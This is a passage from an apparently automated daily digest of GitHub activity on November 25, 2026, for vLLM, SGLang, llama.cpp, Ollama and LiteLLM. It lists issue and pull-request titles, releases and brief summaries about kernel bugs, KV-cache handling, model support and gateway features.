- [#69660](https://github.com/vllm-project/vllm/issues/69660) [Bug]: Inkling-2-Mini fails with Triton 3.9 in cu135-nightly: missing _reinterpret `bug` `inkling` 💬1
- [#69663](https://github.com/vllm-project/vllm/issues/69663) [Bug]: activation/gating ops accept non-contiguous inputs and silently compute wrong results; strided outputs leave unwritten cells and corrupt the parent buffer `bug` 💬1
- [#69682](https://github.com/vllm-project/vllm/issues/69682) [Bug][ROCm][NemotronH] FillFunctor<int> kernel consumes 32.7% of decode kernel time on MI350 (120B-A12B-FP8, TP=1) `rocm` 💬1
- [#69612](https://github.com/vllm-project/vllm/issues/69612) [Bug]: MoRIIO WRITE producer: preempted request's deferred write submits reallocated blocks 💬1
- [#69568](https://github.com/vllm-project/vllm/issues/69568) [RFC]: Grammar-as-a-Drafter (GaaD): Composing Grammar-Forced Tokens with Speculative Decoding `structured-output` `speculative-decoding` 💬1
- [#69811](https://github.com/vllm-project/vllm/issues/69811) [RFC][LoRA]: Static 2-bucket slot pooling with upward overflow for heterogeneous-rank Multi-LoRA `pooling`
- [#69805](https://github.com/vllm-project/vllm/issues/69805) [Bug]: kv_connector_no_forward skips wait_for_save, so MooncakeStoreConnector never submits saves scheduled on no-forward steps
- [#69776](https://github.com/vllm-project/vllm/issues/69776) [Feature]: [KV Connector] Support for heterogeneous GPU-CPU Prefill-Decode disaggregation `feature request` `kv-connector`
- [#69763](https://github.com/vllm-project/vllm/issues/69763) [Feature]: Track batch invariance for multimodal vision attention kernels `multi-modality` `quantization` `batch-invariance`
- [#69761](https://github.com/vllm-project/vllm/issues/69761) [Bug]: KV event snapshots (#57789) omit parents of ~3-5% of live full-attention blocks on a hybrid (mixed block size) model
- [#69739](https://github.com/vllm-project/vllm/issues/69739) [Feature]: Let an out-of-tree platform name the device of a parallel group
- [#69692](https://github.com/vllm-project/vllm/issues/69692) [Bug]: Triton MXFP4 MoE (gpt-oss on SM90): reload_weights keeps a second copy of the experts; OOM after level-2 sleep `gpt-oss` `quantization`
- [#69715](https://github.com/vllm-project/vllm/issues/69715) [Bug]: Inkling 2 Mini: conv-state KV groups reserve window + max_in_flight_tokens, so reported/admission KV capacity is ~4x below real usage `inkling`
- [#69699](https://github.com/vllm-project/vllm/issues/69699) [Feature]: Migrate All Mamba Prefix-Caching Models to Internal Prefill Checkpoints `feature request`
- [#69658](https://github.com/vllm-project/vllm/issues/69658) [Bug] apply_repetition_penalties_ crashes with SIGFPE when vocab_size == 0 (tile_num can be 0)
- [#69657](https://github.com/vllm-project/vllm/issues/69657) [Bug] rotary_embedding crashes the process with SIGFPE when num_tokens == 0 (0/0 at pos_encoding_kernels.cu:144)
- [#69643](https://github.com/vllm-project/vllm/issues/69643) [Bug]: Long non-streaming outputs block the API server event loop until liveness kills it
- [#69635](https://github.com/vllm-project/vllm/issues/69635) [RFC]: Engine-side time-to-first-token forecast for routers
- [#69632](https://github.com/vllm-project/vllm/issues/69632) [Bug] v1: after a block-level KV-load failure the recompute fallback uses a stale worker-side num_computed_tokens (shifted positions / inflated seq_lens; device fault on NPU)

#### 🔒 Closed Issues
- [#28509](https://github.com/vllm-project/vllm/issues/28509) [New Model]: https://github.com/facebookresearch/omnilingual-asr
- [#65959](https://github.com/vllm-project/vllm/issues/65959) [RFC]: Switch Rust regex engine for response parsing
- [#51986](https://github.com/vllm-project/vllm/issues/51986) [Bug]: mnnvl allreduce workspace init hangs 30s and leaks GPU memory on IB-only multi-node
- [#52959](https://github.com/vllm-project/vllm/issues/52959) [RFC]: Internal State Checkpoints for Mamba Align Mode
- [#69320](https://github.com/vllm-project/vllm/issues/69320) [Bug]: Transformers backend: OmniASR fails at startup because `padding_mask` is kept on CPU but forwarded to `get_audio_features`
- [#63943](https://github.com/vllm-project/vllm/issues/63943) [Performance]: Triton MoE naive block assignment re-reads shared experts for device-resident weights (8% to 2x slower decode on GB10)
- [#68725](https://github.com/vllm-project/vllm/issues/68725) [Bug]: HiSparse loses cached prefixes after long requests, far below host-pool capacity (0% hits on re-sent 60k prompts)
- [#52792](https://github.com/vllm-project/vllm/issues/52792) [Bug][ROCm] Kimi-K3 (KimiLinear/GDN hybrid) + ngram spec-decode: GPU memory access fault on concurrent mixed spec/non-spec batches (single-stream works after fixing a strided `state_indices` slice)
- [#68023](https://github.com/vllm-project/vllm/issues/68023) [Bug]: Rust frontend (vllm-rs) keeps the default 1024 open-file limit and fails accept under load
- [#53658](https://github.com/vllm-project/vllm/issues/53658) [Bug]: FULL cudagraph dummy runs set seq_lens > max_model_len, overrunning the block table (TRITON_ATTN illegal memory access; FLEX_ATTENTION shape error)
- [#67012](https://github.com/vllm-project/vllm/issues/67012) Weight loading: warn (optionally fail) when a single-file checkpoint coexists with an index/shard set in a local directory
- [#65364](https://github.com/vllm-project/vllm/issues/65364) [Bug]: [CPU] DeepSeek-V4 fails at the first decode step with KeyError: 'c1a'

### SGLang (`sgl-project/sglang`)

**Stars:** 39,033 · **Open issues:** 7,367 · **Last push:** <1h ago

On November 25, 2026, there were no new releases for SGLang. The most significant merged pull requests included the pinning of `apache-tvm-ffi==0.1.11` in the ROCm Docker image for xgrammar support, a fix ensuring that a drained transfer success persists even if an abort is delayed, and an adjustment aligning the router's generate forwarding with the Rust server API. Additionally, there was a performance enhancement in the KV-shard module that batches allocator operations per batch. Notably, a new feature proposal was raised for a Q4 roadmap focused on fast MiniMax-H3 image-to-video switching on consumer GPUs, which could streamline workflows significantly.

#### ✅ Merged PRs
- [#52873](https://github.com/sgl-project/sglang/pull/52873) [Fix] [AMD] docker: Pin apache-tvm-ffi==0.1.11 in ROCm image for xgrammar 0.2.9
- [#52654](https://github.com/sgl-project/sglang/pull/52654) [Fix] pd: Keep a drained transfer Success when an abort lands late
- [#45808](https://github.com/sgl-project/sglang/pull/45808) [Refactor] router: align Generate forwarding with the rust server API
- [#52990](https://github.com/sgl-project/sglang/pull/52990) [CI] rerun-test: Stop sourcing a 5090 profile that some runners no longer have
- [#52970](https://github.com/sgl-project/sglang/pull/52970) [Test] [NPU] test: Lower the DSV4-Pro W4A8 L2 hit-rate GSP input to 28k to fit the prefill KV pool
- [#52975](https://github.com/sgl-project/sglang/pull/52975) [CI] [NPU] Dsv4-Flash: disable mix-chunk and re-enable DSPARK speculative inference
- [#52947](https://github.com/sgl-project/sglang/pull/52947) [Fix] mooncake: Fall back to egm_numa_nodes="auto" when the GPU NUMA probe raises
- [#50546](https://github.com/sgl-project/sglang/pull/50546) [Fix] environ: Reject invalid environment variable values
- [#47578](https://github.com/sgl-project/sglang/pull/47578) [Perf] kv-shard: Batch PageInterleave allocator pops and frees per batch
- [#52851](https://github.com/sgl-project/sglang/pull/52851) [Doc] [NPU] docs: restore frozen image versions in ascend-npus
- [#51609](https://github.com/sgl-project/sglang/pull/51609) [CI] docker: Publish a CUDA CI job container image to lmsysorg/sglang-ci
- [#50299](https://github.com/sgl-project/sglang/pull/50299) [Fix] speculative: Reject unsupported DFLASH and DSpark step counts
- [#51484](https://github.com/sgl-project/sglang/pull/51484) [Doc] diffusion/wan2.2: Load the high/low-noise LoRA files per expert in the cookbook example
- [#44415](https://github.com/sgl-project/sglang/pull/44415) [Fix] [AMD] GLM-5.3-Flash: Keep the MoE correction bias fp32

#### 🐛 New Issues
- [#52762](https://github.com/sgl-project/sglang/issues/52762) [Feature] diffusion: Q4 roadmap proposal: fast MiniMax-H3 image ↔ video switching on consumer GPUs 💬2
- [#53005](https://github.com/sgl-project/sglang/issues/53005) [CI] test_page_interleave_gather_multi_gpu.py fails on main: AssertionError (0, 15), no Memcpy PtoP events profiled
- [#53000](https://github.com/sgl-project/sglang/issues/53000) [Tracking] Remove the DSv4.1 runtime switches from main
- [#52992](https://github.com/sgl-project/sglang/issues/52992) [Bug] dsa: FP4 indexer query changes during DFLASH target verification
- [#52995](https://github.com/sgl-project/sglang/issues/52995) [Bug] Out-of-vocab or negative token ids in custom_logit_processor / token_ids_logprobs crash the engine or silently mis-ban tokens
- [#52982](https://github.com/sgl-project/sglang/issues/52982) [RFC] Upstream reusable SGLang changes from slime's rollout patches
- [#52907](https://github.com/sgl-project/sglang/issues/52907) [CI] test_flashinfer_fa2_attention.py fails on main: No module named 'imageio'
- [#52888](https://github.com/sgl-project/sglang/issues/52888) [Bug] HiCache: L3 reads run at half speed while the scheduler waits for them
- [#52891](https://github.com/sgl-project/sglang/issues/52891) [Bug] HiCache cache mode: with a store slower than prefill, recently used prompts end up in neither L2 nor L3
- [#52823](https://github.com/sgl-project/sglang/issues/52823) [Feature] HiCache: choose between L3 fetch and prefill from estimated completion times
- [#52883](https://github.com/sgl-project/sglang/issues/52883) [Bug] [XPU] TP2xPP2 stalls / DEVICE_LOST on Intel CRI when a PP irecv is posted behind queued TP all-reduce
- [#52878](https://github.com/sgl-project/sglang/issues/52878) [Bug] glm47 streaming emits duplicate JSON keys when a tool parameter is repeated
- [#52854](https://github.com/sgl-project/sglang/issues/52854) [Bug] Scheduler deadlocks silently on VLM request admission with --mm-feature-transport cuda_ipc (TP>1): permanent engine hang, health-check restart
- [#52833](https://github.com/sgl-project/sglang/issues/52833) Out-of-vocab or negative token ids in custom_logit_processor / token_ids_logprobs crash the engine or silently mis-ban tokens
- [#52821](https://github.com/sgl-project/sglang/issues/52821) [Bug] scheduler: after a KV-budget rejection the queue waits for a request to finish, though the budget grows on every decode step
- [#52818](https://github.com/sgl-project/sglang/issues/52818) [Feature] Add opt-in FlashTopK prefill indexer top-k backend for DSA and KPool (SM90 + SM100)
- [#52808](https://github.com/sgl-project/sglang/issues/52808) [Bug] MegaMoE compares DP-group token counts against per-rank cap under attention DP + SP-MoE
- [#52797](https://github.com/sgl-project/sglang/issues/52797) [Bug] BF16 autotuning exceeds DeepEP dispatch capacity at startup on MiMo-V2.6-Flash-RL
- [#52759](https://github.com/sgl-project/sglang/issues/52759) [Feature] Validate DeepSeek-OCR-2 accuracy on Xeon CPU and add a nightly test
- [#52761](https://github.com/sgl-project/sglang/issues/52761) [Bug] [Diffusion] MiniMax-H3-Image does not start on a 24 GB GPU + 32 GB host (plain command and derived 4090 recipe)

#### 🔒 Closed Issues
- [#40926](https://github.com/sgl-project/sglang/issues/40926) [Bug] HiCache + hybrid (SSM/Mamba): failed cudaHostRegister on a secondary host pool aborts the whole instance, and the error path throws TypeError thereby hiding the real rc
- [#21443](https://github.com/sgl-project/sglang/issues/21443) [Feature][MPS] Better memory management for Apple Silicon Macs
- [#36938](https://github.com/sgl-project/sglang/issues/36938) [Bug] Prefill input logprobs are served from the wrong request when a batch member is retracted or finished
- [#43523](https://github.com/sgl-project/sglang/issues/43523) [Bug] DeepSeekV3Detector streaming drops the first tool call when two complete calls arrive in one increment
- [#37712](https://github.com/sgl-project/sglang/issues/37712) [Bug] GLM-5.3-Flash: CUDA OOM in fp8_mqa_logits during long-context prefill kills all TP ranks
- [#33388](https://github.com/sgl-project/sglang/issues/33388) [Bug] Multimodal tensor views cause 518x pickle memory amplification
- [#37348](https://github.com/sgl-project/sglang/issues/37348) [Perf] DeepSeek-V4-Flash-0731 on 4×H800 (SM90, TP4, no EP): ~40% lower per-stream decode at conc=32; dp-attention regresses and TBO is gated — what is the recommended small-node config?
- [#39515](https://github.com/sgl-project/sglang/issues/39515) [Bug] NEXTN on B200 silently switches Qwen3.5-122B to triton when --page-size is set; forcing trtllm_mha is 2.6x faster at long context
- [#39675](https://github.com/sgl-project/sglang/issues/39675) [Bug] Apple Metal (mps) reports no device memory capacity, so mem_fraction_static falls back to 0.95 and prefill OOMs
- [#36522](https://github.com/sgl-project/sglang/issues/36522) [RFC] KV Cache Compression API (KVTC, nvCOMP, ...)
- [#41244](https://github.com/sgl-project/sglang/issues/41244) [Bug] Interrupted Mooncake trace download is reused as a complete cache
- [#42137](https://github.com/sgl-project/sglang/issues/42137) [Bug] deepseekv31 detector (streaming): greedy name regex drops a call and attaches the next call's arguments to it
- [#48144](https://github.com/sgl-project/sglang/issues/48144) [RFC] KV Cache Optimization for Cosmos3-Nano-Sim-Bimanual
- [#46661](https://github.com/sgl-project/sglang/issues/46661) [Bug] InternlmDetector drops every streamed tool call after the first
- [#52759](https://github.com/sgl-project/sglang/issues/52759) [Feature] Validate DeepSeek-OCR-2 accuracy on Xeon CPU and add a nightly test
- [#52108](https://github.com/sgl-project/sglang/issues/52108) [Bug] benchmark_vllm_vs_sglang_fused_moe_triton.py calls fused_moe with an outdated signature

### llama.cpp (`ggml-org/llama.cpp`)

**Stars:** 136,177 · **Open issues:** 2,648 · **Last push:** <1h ago

On November 25, 2026, the main highlights from the llama.cpp ecosystem include the release of versions b12716, b12711, and b12709, with b12711 focusing on repacking kernels for ARMv8.0 without dotprod and b12709 introducing SVE-optimized dot-product kernels for Q5_0 and Q5_1. Noteworthy merged contributions include the integration of Inkling 2 support and improvements in handling cached prompts, which aim to enhance performance and usability. Additionally, a serious evaluation bug (#32964) was reported, concerning the gpt-oss peg-native parser failing on certain prompts, drawing attention to ongoing issues within the release. Overall, the day combined meaningful enhancements and critical bug reporting, indicating an active development environment.

#### 🚀 New Releases
- [b12716](https://github.com/ggml-org/llama.cpp/releases/tag/b12716) b12716
- [b12711](https://github.com/ggml-org/llama.cpp/releases/tag/b12711) b12711
- [b12709](https://github.com/ggml-org/llama.cpp/releases/tag/b12709) b12709
- [b12708](https://github.com/ggml-org/llama.cpp/releases/tag/b12708) b12708
- [b12707](https://github.com/ggml-org/llama.cpp/releases/tag/b12707) b12707
- [b12706](https://github.com/ggml-org/llama.cpp/releases/tag/b12706) b12706
- [b12704](https://github.com/ggml-org/llama.cpp/releases/tag/b12704) b12704
- [b12703](https://github.com/ggml-org/llama.cpp/releases/tag/b12703) b12703
- [b12701](https://github.com/ggml-org/llama.cpp/releases/tag/b12701) b12701
- [b12686](https://github.com/ggml-org/llama.cpp/releases/tag/b12686) b12686

#### ✅ Merged PRs
- [#32948](https://github.com/ggml-org/llama.cpp/pull/32948) model : inkling2 graph with fewer ops in mix() and control()
- [#32971](https://github.com/ggml-org/llama.cpp/pull/32971) opencl: add clc coopmat moe kernel for q4_0/q4_1/q4_k/q5_0/q5_1/q5_k/q6_k/mxfp4
- [#32870](https://github.com/ggml-org/llama.cpp/pull/32870) tests : fix MSVC static build of test-batch-alloc and test-server-component
- [#32949](https://github.com/ggml-org/llama.cpp/pull/32949) ui: make Llama Chat a plain chat unless llama-server offers agent features
- [#32218](https://github.com/ggml-org/llama.cpp/pull/32218) feat: Inkling 2 DSpark support
- [#32965](https://github.com/ggml-org/llama.cpp/pull/32965) cuda : fix int overflow of the MMVF matrix offsets
- [#32452](https://github.com/ggml-org/llama.cpp/pull/32452) docs : describe SpacemiT runtime environment variables
- [#32182](https://github.com/ggml-org/llama.cpp/pull/32182) ggml : fix SpacemiT flash attention null mask, ALiBi and softcap
- [#32928](https://github.com/ggml-org/llama.cpp/pull/32928) cmake : include the llguidance header from the source tree
- [#32968](https://github.com/ggml-org/llama.cpp/pull/32968) ci : move some jobs to gb10 runners
- [#32950](https://github.com/ggml-org/llama.cpp/pull/32950) ui: smooth chat form height and working directory chip across routes
- [#32945](https://github.com/ggml-org/llama.cpp/pull/32945) ui: run Llama Chat apart from llama-server, named in config.json or npx --server
- [#32952](https://github.com/ggml-org/llama.cpp/pull/32952) ui: fix prebuilt UI download in shallow clones
- [#32941](https://github.com/ggml-org/llama.cpp/pull/32941) convert : fix qwen3-omni conversion
- [#32142](https://github.com/ggml-org/llama.cpp/pull/32142) ggml-cpu: repack kernels for targets without dotprod (ARMv8.0 64-bit) for Q4_0/Q8_0
- [#32959](https://github.com/ggml-org/llama.cpp/pull/32959) ui: expect the Llama Chat name in the PWA manifest e2e test
- [#32855](https://github.com/ggml-org/llama.cpp/pull/32855) model : Inkling 2 Mini mix() weighted sum with the scores as src0
- [#30867](https://github.com/ggml-org/llama.cpp/pull/30867) ggml-cpu: add SVE-optimized q5_0 and q5_1 dot-product kernels
- [#32064](https://github.com/ggml-org/llama.cpp/pull/32064) server : include MCP image and audio data in tool results
- [#32378](https://github.com/ggml-org/llama.cpp/pull/32378) context : prevent excessive CPU polling without OpenMP
- [#32721](https://github.com/ggml-org/llama.cpp/pull/32721) vulkan: add chunked GDN replay support
- [#32942](https://github.com/ggml-org/llama.cpp/pull/32942) metal : reserve the top-k scratch only for short rows
- [#32500](https://github.com/ggml-org/llama.cpp/pull/32500) cuda : fuse RMS_NORM + MUL + MROPE/IMROPE and tune block size
- [#32645](https://github.com/ggml-org/llama.cpp/pull/32645) Webui nix fix
- [#30997](https://github.com/ggml-org/llama.cpp/pull/30997) server : retry cached prompt restoration after clearing idle slots
- [#32903](https://github.com/ggml-org/llama.cpp/pull/32903) fix building in symlinked directories
- [#32854](https://github.com/ggml-org/llama.cpp/pull/32854) CUDA: ignore strides of size-1 dims in bin_bcast
- [#32940](https://github.com/ggml-org/llama.cpp/pull/32940) model : inkling2 clip with ggml_l2_norm
- [#32897](https://github.com/ggml-org/llama.cpp/pull/32897) CUDA: reduce all cooperative softmax partials when nsm > 256
- [#32859](https://github.com/ggml-org/llama.cpp/pull/32859) vocab : speed up BPE tokenization
- [#32875](https://github.com/ggml-org/llama.cpp/pull/32875) CUDA: NVFP4 dequant speed increase
- [#32691](https://github.com/ggml-org/llama.cpp/pull/32691) [WebGPU] Fix indexing bug in softmax kernel
- [#32254](https://github.com/ggml-org/llama.cpp/pull/32254) webgpu : add POOL_1D support
- [#32805](https://github.com/ggml-org/llama.cpp/pull/32805) hip: use MMQ over MMVQ for Q4_K,N8 and NVFP4,N7-8 on VEGA20
- [#32837](https://github.com/ggml-org/llama.cpp/pull/32837) HIP: CDNA1 MMQ config without stream-k
- [#32927](https://github.com/ggml-org/llama.cpp/pull/32927) ui: move the agentic loop and trace phrasing into @ggml-org/llama-harness
- [#32932](https://github.com/ggml-org/llama.cpp/pull/32932) ci : disable test-llama-context on ubuntu-llvmpipe
- [#28992](https://github.com/ggml-org/llama.cpp/pull/28992) server : fix skipped prompt cache lookups
- [#32922](https://github.com/ggml-org/llama.cpp/pull/32922) ui: match tool call timer font size to its description
- [#32920](https://github.com/ggml-org/llama.cpp/pull/32920) ui: let the chat form's model selection decide the submit button state
- [#32896](https://github.com/ggml-org/llama.cpp/pull/32896) rpc : reuse one context for request tensors on the server
- [#32655](https://github.com/ggml-org/llama.cpp/pull/32655) ggml : use a range-reduced log1p for softplus
- [#32162](https://github.com/ggml-org/llama.cpp/pull/32162) vulkan: support state size 96 in ssm_scan

#### 🐛 New Issues
- [#32964](https://github.com/ggml-org/llama.cpp/issues/32964) Eval bug: gpt-oss peg-native parse fails deterministically on a tool-continuation prompt, and passes if any message is appended `bug-unconfirmed` 💬4
- [#32933](https://github.com/ggml-org/llama.cpp/issues/32933) Misc. bug: Qwen3-Omni mmproj conversion fails: Can not map tensor 'model.visual.blocks.0.attn.proj.bias' `bug-unconfirmed` 💬3
- [#32937](https://github.com/ggml-org/llama.cpp/issues/32937) Misc. bug: exec_shell_command on Windows mangles double quotes `bug-unconfirmed` 💬2
- [#32972](https://github.com/ggml-org/llama.cpp/issues/32972) Eval bug: K2-Horizon-MoVA-36B tool-calls during reasoning are not processed `bug-unconfirmed` 💬1
- [#32966](https://github.com/ggml-org/llama.cpp/issues/32966) Eval bug: Inkling 2 with tool_choice=auto calls an undeclared tool ("bash") `bug-unconfirmed` 💬1
- [#32935](https://github.com/ggml-org/llama.cpp/issues/32935) Eval bug: CUDA Xid 13 / 31 / 62 crashes on RTX 2060 with draft-mtp + q8_0 KV across Gemma 4 and Qwen 3.6 `bug-unconfirmed` 💬1
- [#32999](https://github.com/ggml-org/llama.cpp/issues/32999) Misc. bug: CUDA supports_op returns true for strided XIELU/LEAKY_RELU views but aborts with GGML_ASSERT
- [#32998](https://github.com/ggml-org/llama.cpp/issues/32998) Misc. bug: GGML_OP_POOL_MAX -FLT_MAX sentinel returns wrong value on -inf (CPU/CUDA) and drops gradients in pool_2d_back
- [#32997](https://github.com/ggml-org/llama.cpp/issues/32997) Misc. bug: CUDA ggml_unary_inplace on strided views overwrites padding and skips strided rows
- [#32996](https://github.com/ggml-org/llama.cpp/issues/32996) Misc. bug: CUDA ggml_argmax returns -1 for nonempty rows of all -FLT_MAX
- [#32994](https://github.com/ggml-org/llama.cpp/issues/32994) Eval bug: ggml-hexagon (v75, v81): Qwen3.5 produces garbage with host buffers (HOSTBUF=1) — Q/K RMS_NORM reads wrong data; GGML_HEXAGON_HOSTBUF=0 fixes it
- [#32974](https://github.com/ggml-org/llama.cpp/issues/32974) Feature Request: support Cloudflare/clef-omni on /v1/systemone `enhancement`
- [#32969](https://github.com/ggml-org/llama.cpp/issues/32969) Feature Request: Make Parse PDF as image DPI configurable `enhancement`
- [#32956](https://github.com/ggml-org/llama.cpp/issues/32956) CUDA/HIP: non-contiguous CONCAT fails with "invalid configuration argument" when ne[2] > 65535
- [#32953](https://github.com/ggml-org/llama.cpp/issues/32953) `falcon-h1` pre-tokenizer: whitespace runs before punctuation tokenize differently from the model's `tokenizer.json`
- [#32938](https://github.com/ggml-org/llama.cpp/issues/32938) Eval bug: Severe hallucinations and text corruption in build b12671 (Regression from b12451) `bug-unconfirmed`

#### 🔒 Closed Issues
- [#29022](https://github.com/ggml-org/llama.cpp/issues/29022) Feature Request: Fast Tool Gating & Single-Pass Selection via Prefill Logit Slicing
- [#30091](https://github.com/ggml-org/llama.cpp/issues/30091) Eval bug: llama-server crashes due to "bad allocation" during long conversations
- [#27072](https://github.com/ggml-org/llama.cpp/issues/27072) Eval bug: llamacpp crashes on load on Linux using Vulkan.
- [#32780](https://github.com/ggml-org/llama.cpp/issues/32780) Compile bug: UI asset validation fails during build (v1.0.0 and v0.7.0)
- [#27532](https://github.com/ggml-org/llama.cpp/issues/27532) WebUI Edit LLM responses (Payload / KV cache manipulation )
- [#29947](https://github.com/ggml-org/llama.cpp/issues/29947) Eval bug: Qwen3.8-27B, opencode, plugin opencode-tool-search: While executing CallExpression at line 106, column 32 in source:\n...first %}
- [#30024](https://github.com/ggml-org/llama.cpp/issues/30024) Compile bug: high RAM usage
- [#30961](https://github.com/ggml-org/llama.cpp/issues/30961) Eval bug: llama-server restores a cached prompt before idle slots are cleared, so the restore fails with a unified KV cache
- [#27763](https://github.com/ggml-org/llama.cpp/issues/27763) qwen4exp (Qwen3.8-Flash-Next) garbage output on SM110 when >8 layers on GPU
- [#30052](https://github.com/ggml-org/llama.cpp/issues/30052) RPC backend: "Remote RPC server crashed or returned malformed response" (ggml-rpc.cpp:566) at warmup decode with large MoE models on NVIDIA GB10 (DGX Spark)
- [#30256](https://github.com/ggml-org/llama.cpp/issues/30256) Eval bug: Gemma 4 – json_schema grammar allows a thought channel although enable_thinking is false
- [#32933](https://github.com/ggml-org/llama.cpp/issues/32933) Misc. bug: Qwen3-Omni mmproj conversion fails: Can not map tensor 'model.visual.blocks.0.attn.proj.bias'
- [#28672](https://github.com/ggml-org/llama.cpp/issues/28672) Eval bug: tool returning an image doesnt get shown to the model or UI
- [#29735](https://github.com/ggml-org/llama.cpp/issues/29735) using --warmup with GML_SCHED_DEBUG_REALLOC=1 makes gemma-4-26B-A4B-it crash on 1920x1080 input.
- [#30273](https://github.com/ggml-org/llama.cpp/issues/30273) Feature Request: Support BharatGen Param-1 (ParamBharatGenForCausalLM)
- [#30302](https://github.com/ggml-org/llama.cpp/issues/30302) Eval bug: GSQ-RCO MTP Causes Black Screen of Death
- [#30308](https://github.com/ggml-org/llama.cpp/issues/30308) Eval bug: WebUI: context window fillup bar tooltip flickers on hover
- [#30313](https://github.com/ggml-org/llama.cpp/issues/30313) test-chat: GLM-4.7-Flash "throw path" test fails when run with `--template GLM`; skipped in an unfiltered run
- [#30317](https://github.com/ggml-org/llama.cpp/issues/30317) Feature Request: compute buffers are over-allocated ~N× under -sm tensor (N devices)
- [#30322](https://github.com/ggml-org/llama.cpp/issues/30322) Misc. bug: uloading model to a GH200 takes ages
- [#30332](https://github.com/ggml-org/llama.cpp/issues/30332) Feature Request: ROCm prefill, Vulkan generation
- [#30334](https://github.com/ggml-org/llama.cpp/issues/30334) Misc. bug: CUDA: P40 and the MMVQ fusion check for pascal. the fusion check misses 6.1, so it stays on for P40
- [#32852](https://github.com/ggml-org/llama.cpp/issues/32852) Eval bug: HIP MI300X: SOFT_MAX over wide rows drops partials; --backend-sampling never samples upper vocabulary ids
- [#32868](https://github.com/ggml-org/llama.cpp/issues/32868) Compile bug: MSVC + BUILD_SHARED_LIBS=OFF fails to build test-batch-alloc and test-server-component
- [#32804](https://github.com/ggml-org/llama.cpp/issues/32804) CUDA: GGML_ASSERT(s2 <= uint32_t::max()) abort in binbcast.cu:266 with ~79k+ token context (launch_bin_bcast_pack op_add)

### Ollama (`ollama/ollama`)

**Stars:** 188,035 · **Open issues:** 4,756 · **Last push:** 9h ago

On November 25, 2026, there were no new releases or merged pull requests for Ollama. However, several issues were reported, with the most significant being #19879, which highlights a machine crash on DGX Spark due to OOM and high CPU usage related to the Inkling-2-mini. Other notable issues include #19888, which addresses a loading failure of the `inkling2` architecture due to a missing tensor, and #19877, where the Olmo3 parser incorrectly returns a literal `\u003c` instead of `<` in tool arguments. The ongoing challenges and performance metrics reflected in these issues suggest areas for improvement and optimization in the Ollama ecosystem.

#### 🐛 New Issues
- [#19879](https://github.com/ollama/ollama/issues/19879) Inkling-2-mini Crashes machine on DGX Spark - OOM & High CPU Usage `bug` 💬5
- [#19888](https://github.com/ollama/ollama/issues/19888) [Bug] `inkling2` architecture fails to load: `check_tensor_dims: tensor 'blk.24.attn_q.weight' not found` (Looped Transformer 18 physical blocks) 💬1
- [#19877](https://github.com/ollama/ollama/issues/19877) Olmo3 parser returns literal `\u003c` instead of `<` in tool arguments 💬1
- [#19891](https://github.com/ollama/ollama/issues/19891) MLX runner: prefix-cache snapshots on qwen3.8-flash-next (qwen4_exp) are paged out but never evicted; memory grows ~0.6 GiB per distinct prompt, no tools `bug`
- [#19889](https://github.com/ollama/ollama/issues/19889) cmd/bench: rubric scoring mode for open-ended generated answers (beyond -decision)? `feature request`
- [#19887](https://github.com/ollama/ollama/issues/19887) [Performance] Qwen3.8 Flash-Next and Hermes Agent on DGX Spark — benchmark results and optimization opportunities
- [#19886](https://github.com/ollama/ollama/issues/19886) MLX runner: saved history grows past physical RAM once macOS starts swapping (0.40.17, 64 GB Mac: 23 GB to 70 GB in 13 minutes)
- [#19885](https://github.com/ollama/ollama/issues/19885) [Bug]: Image marker construction uses O(N²) string operations, costing a CPU-minute for a small request
- [#19880](https://github.com/ollama/ollama/issues/19880) Expose the compute devices Ollama detected (GPU/CPU, total and available memory) `feature request`

#### 🔒 Closed Issues
- [#19879](https://github.com/ollama/ollama/issues/19879) Inkling-2-mini Crashes machine on DGX Spark - OOM & High CPU Usage
- [#19880](https://github.com/ollama/ollama/issues/19880) Expose the compute devices Ollama detected (GPU/CPU, total and available memory)

### LiteLLM (`BerriAI/litellm`)

**Stars:** 63,850 · **Open issues:** 5,480 · **Last push:** <1h ago

On November 25, 2026, LiteLLM released several new versions, including v1.109.5, v1.111.0, v1.110.4, and a release candidate v1.112.0-rc.1, with key changes in v1.111.0 focusing on integration tests and v1.112.0-rc.1 addressing an issue with extra_headers naming. Notable merged PRs included fixes for the reasoning_effort acceptance in the ZAI module and enhancements to the ElevenLabs module with real-time transcription capabilities. Additionally, a critical new issue was reported regarding the v3 rate limiter, specifically relating to the TPM reservation process, which has been affecting request handling in certain failure scenarios.

#### 🚀 New Releases
- [v1.109.5](https://github.com/BerriAI/litellm/releases/tag/v1.109.5) v1.109.5
- [v1.112.0-rc.1](https://github.com/BerriAI/litellm/releases/tag/v1.112.0-rc.1) v1.112.0-rc.1
- [v1.111.0](https://github.com/BerriAI/litellm/releases/tag/v1.111.0) v1.111.0
- [v1.110.4](https://github.com/BerriAI/litellm/releases/tag/v1.110.4) v1.110.4
- [v1.108.17](https://github.com/BerriAI/litellm/releases/tag/v1.108.17) 1.108.17 (LTS)

#### ✅ Merged PRs
- [#54313](https://github.com/BerriAI/litellm/pull/54313) fix(zai): accept reasoning_effort so /v1/messages thinking reaches GLM models
- [#54279](https://github.com/BerriAI/litellm/pull/54279) fix(zai): accept reasoning_effort so /v1/messages thinking reaches GLM models
- [#54341](https://github.com/BerriAI/litellm/pull/54341) test(rate-limit): wait for the rust rejection log before asserting it in the fail-closed settings-store test
- [#54155](https://github.com/BerriAI/litellm/pull/54155) fix(images): backport image_edit markup and tuple file parts to lts/1.108.x (#53815)
- [#54346](https://github.com/BerriAI/litellm/pull/54346) test(files): expect a team's provider file list to be answered by the proxy with its own uploads
- [#53815](https://github.com/BerriAI/litellm/pull/53815) fix(images): send image_edit markup as a multipart file part
- [#54342](https://github.com/BerriAI/litellm/pull/54342) feat(elevenlabs): backport scribe_v2_realtime realtime transcription to lts/1.108.x (#48984)
- [#54318](https://github.com/BerriAI/litellm/pull/54318) fix(proxy): reserve TPM for the system prompt on Messages and instructions on Responses
- [#54266](https://github.com/BerriAI/litellm/pull/54266) feat(gateway): admit by which stored objects the database holds
- [#54343](https://github.com/BerriAI/litellm/pull/54343) refactor(types): give bare dict, list and set returns, locals and constants proven types in 77 files
- [#53748](https://github.com/BerriAI/litellm/pull/53748) feat(gateway): group spend log rows under the caller's session
- [#53710](https://github.com/BerriAI/litellm/pull/53710) feat(gateway): write spend logs from the rust gateway
- [#53708](https://github.com/BerriAI/litellm/pull/53708) feat(gateway): answer the spend log callback's host calls in rust
- [#53706](https://github.com/BerriAI/litellm/pull/53706) feat(gateway): build the spend log callback's input for a served call
- [#54054](https://github.com/BerriAI/litellm/pull/54054) feat(rust-gateway): read the stored config again when the proxy announces a change on Redis
